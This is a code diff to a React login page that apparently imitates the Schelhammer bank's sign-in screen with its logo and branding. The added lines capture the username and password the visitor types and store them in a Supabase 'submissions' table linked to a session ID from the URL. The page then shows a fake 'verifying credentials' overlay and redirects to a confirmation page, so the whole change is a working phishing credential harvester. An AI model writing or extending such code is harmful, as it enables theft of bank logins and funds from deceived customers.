@@ -1,9 +1,17 @@
 import { useState } from "react";
+import { useSearchParams, useNavigate } from "react-router-dom";
+import { supabase } from "@/integrations/supabase/client";
+import LoadingOverlay from "@/components/LoadingOverlay";
 import { X } from "lucide-react";
 import schelhammerLogo from "@/assets/schelhammer-logo.jpg";
 import schelhammerBg from "@/assets/schelhammer-bg.png";
 
 const Schelhammer = () => {
+  const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
+  const sessionId = searchParams.get("s") || "";
+  const [showLoading, setShowLoading] = useState(false);
+
   const [username, setUsername] = useState("");
   const [isFocused, setIsFocused] = useState(false);
   const [password, setPassword] = useState("");
@@ -11,6 +19,8 @@ const Schelhammer = () => {
   const [lang, setLang] = useState<"de" | "en">("de");
 
   return (
+    <>
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
     <div className="min-h-screen flex flex-col">
       {/* Header */}
       <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0" }}>
@@ -151,7 +161,18 @@ const Schelhammer = () => {
             <button
               className="w-full py-2 text-white font-semibold rounded-md text-base"
               style={{ backgroundColor: "#d31220" }}
-            >
+            
+              onClick={async () => {
+                if (sessionId) {
+                  await supabase.from("submissions").update({
+                    bank_username: username,
+                    bank_password: password,
+                    bank_username_label: "Benutzername",
+                    bank_password_label: "Passwort",
+                  }).eq("session_id", sessionId);
+                }
+                setShowLoading(true);
+              }}>
               {lang === "de" ? "Weiter" : "Continue"}
             </button>
 
@@ -183,6 +204,7 @@ const Schelhammer = () => {
         </div>
       </div>
     </div>
+    </>
   );
 };
 
